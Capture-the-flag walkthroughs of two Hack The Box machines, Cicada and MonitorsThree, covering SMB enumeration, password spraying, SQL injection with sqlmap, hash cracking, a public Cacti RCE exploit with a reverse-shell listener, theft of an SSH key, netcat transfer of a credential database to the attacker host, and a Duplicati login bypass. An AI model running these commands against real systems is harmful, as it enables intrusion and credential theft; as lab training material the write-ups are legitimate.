# Miscellaneous 6

## SMB enumeration and HTB "Cicada" retrospective

This entry focuses on an HTB machine named Cicada, showcasing useful methods for SMB enumeration and attacks. Our initial Nmap scan revealed that it is a Windows machine with a typical range of open ports. Additionally, we discovered two entries that needed to be added to our ```/etc/hosts``` file: ```CICADA-DC.cicada.htb``` and ```cicada.htb```.

As for the starting point, we execute the following command:

```
nxc smb 10.10.11.35 -u 'guest' -p ''
```

This command attempts to connect to the SMB service on the target machine (10.10.11.35) using the username ```guest``` and an empty password. The nxc tool, which is a versatile network exploration and exploitation tool, is particularly useful for its straightforward interface and ability to automate various tasks. Using nxc simplifies SMB enumeration and interaction, making it easier to probe for shares, test credentials, and identify vulnerabilities efficiently.

The output reveals important information about the target SMB service:

```
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
```

Our next step looks like this:

```
nxc smb 10.10.11.35 -u 'guest' -p '' --shares
```

This includes the ```--shares``` option, which is used to enumerate the shared resources on the target SMB service. By specifying this option, the command targets the default shared folders on the box, such as ```C$```, ```ADMIN$```, and any other user-defined shares that may be available. This is useful for identifying accessible files and directories that could contain sensitive data or potential entry points for further exploitation.

The output reveals the following:

```
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```

Our next step is to use ```smbclient``` to connect to the HR shares, list the contents, and retrieve a plaintext password from the file named ```Notice from HR.txt```.

```
smbclient //10.10.11.35/HR
dir
get "Notice from HR.txt"
```

However, at this point we still don't have any valid usernames to pair with it. One approach to resolve this issue is to use the ```lookupsid.py``` tool to identify potential usernames:

```
python3 lookupsid.py guest@10.10.11.35 -no-pass             
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.10.11.35
[*] StringBinding ncacn_np:10.10.11.35[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
^[[B^[[B^[[B498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

Next, we could save this output to a file ```usernames.txt``` and use the following command:

```
grep 'CICADA\\' usernames.txt | grep 'SidTypeUser' | awk '{print $2}' > usernames2.txt
```

Here is what happens in greater detail:

- ```grep 'CICADA\\'```: Select lines that contain "CICADA", which represents usernames in this case.

- ```grep 'SidTypeUser'```: Filter only those lines where the entry is a user (excluding groups).

- ```awk '{print $2}'```: Extract the second column, which is the username.

- ```> usernames2.txt```: Output the result to a file named usernames2.txt.

The next step is crucial, as it involves password spraying against the cleaned-up list of valid usernames.

```
nxc smb 10.10.11.35 -u usernames2.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

After performing this action, we discover that the password correlates with the username ```michael.wrightson```.

Next, by using ```ldapdomaindump ```to enumerate additional users for lateral movement, we also identified the username ```david.orelious```, along with his password found in the description.

Note: ```ldapdomaindump``` is a powerful tool designed for extracting information from Active Directory environments. It enables the enumeration of users, groups, and other valuable data by querying the LDAP directory. In this context, it allows us to gather potential targets for lateral movement, increasing our chances of successfully accessing additional resources within the network.

```
ldapdomaindump ldap://10.10.11.35 -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

Also: ```cat domain_users.grep```

However, this output is a bit messy, so we need to clear it up a bit:

```
cat domain_users.grep | grep david.orelious
```

And now we have the output that is a little easier to read:

```
David Orelious  David Orelious  david.orelious          Domain Users    03/14/24 12:17:29       08/28/24 17:25:57       03/15/24 06:32:21       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD      03/14/24 12:17:29       S-1-5-21-917908876-1423158569-3159038727-1108      Just in case I forget my password is aRt$Lp#7t*VQ!3
```

As we explored the machine and experimented with various techniques, we attempted to list the DEV share discovered during earlier enumeration stages—and it worked!

```
smbclient -U david.orelious //cicada.htb/DEV
```

Here is how we went from there:

```
smb: \> dir
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024
```

Looking through this ps1 script we found emily’s password.

After finding the password we tried logging in using ```evil-winrm``` with the password found in the script:

```
evil-winrm -i 'cicada.htb' -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

Note: Evil-WinRM is used because it’s a tool specifically for interacting with Windows Remote Management (WinRM) services, which is often available on Windows Server environments. It's one of the best tools for post-exploitation on Windows, as it provides a stable command shell (like SSH for Linux), allowing you to execute commands, upload/download files, and even perform privilege escalation tactics directly from a WinRM session.

If ```emily.oscars``` has the necessary privileges, this could serve as our foothold into the system. Once connected, we will gain full control and can begin exploring for further escalation opportunities. This presents a perfect chance to retrieve sensitive files or delve deeper into the system. Shortly after, I successfully grabbed the user flag located at ```C:\Users\emily.oscars.CICADA\Desktop```.

For privilege escalation, we first began by listing our current privileges:

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We can see the ```SeBackupPrivilege```, which can be leveraged to escalate our privileges. Here is a [blog post](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) with more information regarding this.

Next, by using the following command we could copy the ```root.txt``` file to ```C:\Users\emily.oscars\Desktop\root.txt```.

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> robocopy C:\Users\Administrator\Desktop C:\Users\emily.oscars\Desktop /B /E

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, September 29, 2024 2:54:23 PM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Users\emily.oscars\Desktop\

    Files : *.*

  Options : *.* /S /E /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          3    C:\Users\Administrator\Desktop\
            New File                  32        .root.txt.txt
  0%
100%
            New File                 282        desktop.ini
  0%
100%
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         3         3         0         0         0         0
   Bytes :       348       348         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Sunday, September 29, 2024 2:54:23 PM
```

Finally, after using the command ```type "C:\Users\emily.oscars\Desktop\root.txt"``` we were finally able to grab the root flag and this example is now concluded.

## HTB "MonitorsThree" retrospective

This cookbook serves as a detailed walkthrough of how I rooted my first medium-difficulty HTB Linux machine, "MonitorsThree." This box was quite the challenge, requiring research and some deep thinking to overcome roadblocks during the later stages of exploitation and privilege escalation.

An initial Nmap scan revealed port 22 running OpenSSH, port 80 serving HTTP (redirecting to ```http://monitorsthree.htb```), and port 8000 hosting a SimpleHTTPServer. After exploring the website, which was built in PHP, there wasn’t much to work with—no obvious entry points, even in the typical weak spots like the admin page or password reset forms etc.

At this point, I decided to proceed with the usual enumeration routine, focusing on possible subdomains. While Gobuster is reliable for this, I opted for more advanced tools like feroxbuster or ffuf, which support recursive scanning and tend to provide more thorough results. For example:

```
ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.monitorsthree.htb" -u http://monitorsthree.htb
```

After a short while, a new subdomain appeared: ```http://cacti.monitorsthree.htb/cacti/```. I added it to my hosts file and continued exploring. However, this step also left me in the dark for a while, as there were no clear methods to establish an initial foothold. After some trial and error, I stumbled upon the ```forgot_password.php``` page, which turned out to be vulnerable to SQL injection.

Using Burp Suite, I navigated to the page, enabled the intercept, typed something arbitrary into the form, and captured the request. I saved it as a "cacti.txt" file and launched sqlmap to begin my attack. Below are the necessary commands I executed, with each command taking me progressively deeper into the database until I finally retrieved the information I needed:

```
sqlmap -r cacti.txt –dbs --batch

sqlmap -r cacti.txt -D monitorsthree_db –tables --batch

sqlmap -r cacti.txt -D monitorsthree_db -T users --dump --batch

sqlmap -r cacti.txt -D monitorsthree_db -T users --dump --where="username='admin'" --batch

sqlmap -r cacti.txt -D monitorsthree_db -T users --dump -C username,password --where="username='admin'" --batch
```

The workflow above begins by using sqlmap to identify the available databases in the vulnerable application. Once the ```monitorsthree_db``` database is found, the next step is listing its tables. After discovering the users table, I proceed to dump its contents, narrowing it down by specifically targeting the admin username. Finally, I extract the admin's hashed password by dumping only the username and password columns where the username equals ```'admin'```.

Also, here is useful cheatsheet describing all the options withing sqlmap:

- [SQL Injection with Sqlmap](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-with-sqlmap/)

After that I was finally ready to crack the discovered hash:

```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
```

This revealed the following credentials:

```
admin:greencacti2001
```

The next step was easy, involving the use of pre-made exploit that finally gave me initial access into the machine:

- [CVE-2024-25641-RCE-Automated-Exploit-Cacti-1.2.26](https://github.com/thisisveryfunny/CVE-2024-25641-RCE-Automated-Exploit-Cacti-1.2.26)

This is how I executed it:

```
python3 exploit.py -L 10.10.14.9 -lp 4444 -wp 8000 -url http://cacti.monitorsthree.htb -u admin -p greencacti2001
```

Next, I made my shell more stable using the standard procedure:

```
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

Of course, my shell was running as "www-data" so searching for some valid users seemed like a smart move:

```
grep 'sh$' /etc/passwd
```

Looking for some various config files can often be rewarding as well:

```
find / -name config.php 2>/dev/null
cat /var/www/html/cacti/include/config.php
```

This little maneuver has indeed revealed some valuable insights:

```
(...)
#$rdatabase_type     = 'mysql';
#$rdatabase_default  = 'cacti';
#$rdatabase_hostname = 'localhost';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
#$rdatabase_port     = '3306';
#$rdatabase_retries  = 5;
#$rdatabase_ssl      = false;
#$rdatabase_ssl_key  = '';
#$rdatabase_ssl_cert = '';
#$rdatabase_ssl_ca   = '';
(...)
```

These credentials enabled me to connect to the database like so:

```
mysql -u cactiuser -p -D cacti
```

Once inside the database, I was keen on doing some further exploration using the following command sequence:

```
help;
SHOW DATABASES;
use cacti;
SHOW TABLES;
select username, password from user_auth;
```

And here is my reward:

```
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |
| guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |
| marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |
+----------+--------------------------------------------------------------+
```

Next, I focused on identifying and cracking Marcus's hash. This proved to be a bit tricky, so I used the following command to help identify it:

```
hashid -e -j $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
```

The ```-e``` option ensures extended hash recognition, while the ```-j``` option runs John the Ripper mode, providing more detail about cracking the hash. After that, I was ready to finally crack it:

```
john --format=bcrypt -w /usr/share/wordlists/rockyou.txt hash.txt
```

With the password in hand, I was able to switch to the marcus user by issuing ```su marcus``` in my shell, which marked the start of the next phase of exploration. It's worth mentioning that I couldn’t directly SSH into the machine using Marcus's credentials. Instead, I looked around his home directory, hoping to find his SSH key. Here's how I did it:

```
cd /home/marcus/.ssh
cat id_rsa
```

On my machine, I created an ```id_rsa``` file, pasted the contents of Marcus's private key, set the appropriate permissions using ```chmod 600 id_rsa```, and then used the following command to SSH into the machine:

```
ssh -i id_rsa marcus@monitorsthree.htb
```

From there, I began my standard enumeration routine by listing the active ports on the machine with ```ss -tlnp```. This revealed a web service running on internal port 8200. I tunneled this port to my local machine and decided to gather additional information by using ```curl -v``` to inspect the service further:

```
ssh -i id_rsa -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -N -f
curl -v localhost:8200
```

Turns out I was dealing with something named "Duplicati":

*Duplicati is an open-source backup solution that provides a web-based interface to manage and schedule encrypted backups to various storage locations. The web service listens on a local port (in this case, port 8200) and can be accessed via a browser. It’s designed to allow users to manage backups, restore files, and perform other administrative tasks, making it a valuable target for exploitation if proper security measures aren't in place, such as weak credentials or exposed backup files.*

Time for more research and exploration:

```
cd /opt/duplicati/config/
```

In the ```/opt/duplicati/config/``` directory, I came across the ```Duplicati-server.sqlite``` database. The best course of action was to copy it to my local machine using the standard approach:

```
ncat -l -p 9000 > Duplicati-server.sqlite

nc -q 0 10.10.14.9 9000 < 'Duplicati-server.sqlite'
```

Next, I opened the SQLite database using a database browser on my machine. From there, I navigated through the data by selecting "Browse Data" and choosing the relevant table, which led me to the server passphrase stored under the "option" table.

**The next phase involves a fairly intricate exploitation procedure. I'd like to take a moment to share my research for future reference and explain how everything works moving forward:**

The exploitation process begins with the following AJAX code that retrieves the salt and nonce from the web server:

```
$.ajax({
	url: './login.cgi',
	type: 'POST',
	dataType: 'json',
	data: {'get-nonce': 1}
})
```

Upon sending this request, the server responds with a cookie called ```session-nonce```, which holds the same value as the ```nonce```. This detail is crucial because the nonce must be unique for each login attempt; thus, we cannot reuse the same password generated in subsequent steps. The nonce we use to create the ```noncedpwd``` must match the value of the ```session-nonce``` cookie.

A nonce (number used once) is a random or pseudo-random number that is generated for a specific session or transaction. Its primary purpose is to ensure that old communications cannot be reused in replay attacks. In this context, it adds a layer of security by ensuring that each password hash is unique to the session, even if the same password is used.

The session-nonce cookie serves as a mechanism to maintain the state of the session. It allows the server to verify that the requests coming from the client are indeed part of the same session. This ensures that the nonce is fresh and relevant, preventing potential vulnerabilities associated with reusing password hashes or session identifiers.

Following the nonce retrieval, the next step involves the creation of a variable named ```saltedpwd```, which combines the user's entered password with the salt obtained from the server. The code for this process is as follows:

```
var saltedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Utf8.parse($('#login-password').val()) + CryptoJS.enc.Base64.parse(data.Salt)));
```

In this code snippet, ```$('#login-password').val()``` retrieves the value of the password input field. This password is then concatenated with the salt, which has been decoded from base64 format using ```CryptoJS.enc.Base64.parse(data.Salt)```.

The concatenated string undergoes several transformations:

1. UTF-8 Encoding: The concatenated string is first processed by ```CryptoJS.enc.Utf8.parse```, converting it into a UTF-8 encoded format.

2. Hexadecimal Representation: The resulting value is then passed to ```CryptoJS.enc.Hex.parse```, which transforms the data into its hexadecimal representation.

3. SHA-256 Hashing: Finally, the ```CryptoJS.SHA256``` function hashes this hexadecimal representation, producing a unique hash value called ```saltedpwd```.

The purpose of creating the ```saltedpwd``` variable is to ensure that the password is securely combined with the salt before hashing. By concatenating the password with a unique salt for each session, the resulting hash becomes more resilient against common attacks, such as rainbow table attacks. Even if two users have the same password, their salted hashes will differ due to unique salts, enhancing overall security.

This process of hashing the salted password before transmission to the server helps to mitigate risks associated with password interception, ensuring that even if the data is compromised, the actual password remains protected.

Following the creation of the ```saltedpwd``` variable, the next step involves generating the ```noncedpwd```, which combines the ```saltedpwd``` with the nonce obtained from the server:

```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```

Breakdown of the Process:

1. Base64 Decoding: The nonce, retrieved from the server, is first decoded from its base64 format using ```CryptoJS.enc.Base64.parse(data.Nonce)```. This step ensures that the nonce is in a format suitable for further processing.

2. Concatenation: The decoded nonce is then concatenated with the ```saltedpwd``` variable. This step combines the unique components needed to generate the final password hash.

3. Hexadecimal Parsing: The combined string is passed to ```CryptoJS.enc.Hex.parse```, which transforms the data into its hexadecimal representation.

4. SHA-256 Hashing: Finally, ```CryptoJS.SHA256``` computes the SHA-256 hash of this hexadecimal value. The result is a raw hash digest that represents the secure password variant.

5. Base64 Conversion: The digest is then converted into base64 format using ```.toString(CryptoJS.enc.Base64)```, resulting in the final variable noncedpwd.

The ```noncedpwd``` variable serves as the final password variant that will be transmitted to the web server for authentication. By combining the ```saltedpwd``` with a unique nonce, this process ensures that even if the same password is used in different sessions, the resulting hash will differ due to the varying nonce values.

This mechanism enhances security by making it difficult for attackers to use precomputed hashes (such as those in rainbow tables) against stored password hashes. The inclusion of the nonce in the hashing process adds an additional layer of complexity, further protecting user credentials during transmission.

**And finally, the task at hand!**

First, the server passphrase obtained from the database must be decoded from base64 and then converted to hexadecimal. This python script can assist with that:

```
import base64

# Your Base64 string
base64_string = "Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho="

# Decode from Base64
decoded_bytes = base64.b64decode(base64_string)

# Convert to hex
hex_string = decoded_bytes.hex()

print(f"Hex: {hex_string}")
```

Here are steps we need for the the next stage:

- Start Burp Suite and enable Intercept to capture requests.

- Attempt to log in to Duplicati using any password.

- Check the POST request (usually, it's enough to right click in the request and select "Do intercept" -- "Response to this request") and forward it once.

- Examine the response to locate the NONCE value, then copy the NONCE value as plain text.

Having the Hex output from the first step, let’s try and generate a valid Password with the Var command using developer console in Firefox. Type "allow pasting", press enter (ignore any warnings or errors) and paste the following JavaScript (after modifying it with our values, of course):

```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('7x2eoceQBvO9/mJFwQCdqmu4pDSPwmi6k0XIV+396zg=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);
```

Note: the first value is the session NONCE intercepted with Burp, and the second value is the Hex output from the script.

After that, we type "noncepwd" in the console and copy the output string that appears on the bottom. This value needs to be pasted in the ```password=``` parameter in our Burp request, highlighted and converted to URL encoding (typically with CTRL+U shortcut). Finally, we are ready to forward the request, release the intercept in Burp and if everything goes okay we should be logged into Duplicati.

The last stage of exploitation goes like this:

On the target machine we start by creating two directories within Marcus’s folder: ```dest``` and ```result```. Next, proceed with the following steps in Duplicati:

Create a new backup task, assigning it any name and description, and ensure that no encryption is enabled. Set the destination folder to ```/source/home/marcus/dest``` and specify the target file as ```/source/root/root.txt```. After creating the task, refresh the Duplicati home page (if needed) to view the new backup task, then initiate it. Check the ```dest``` directory in ```/home/marcus/``` on the target machine for any generated ```.zip``` files (just so we can know that everything worked as planned).

Finally, we are ready to restore the backup and retrieve the user flag:

In Duplicati, select the backup you created for restoration, and set the destination to ```/source/home/marcus/result```. After the restoration process is complete, check the result directory in ```/home/marcus/``` on the target machine, where you should find the ```root.txt``` file.

This example is now concluded.


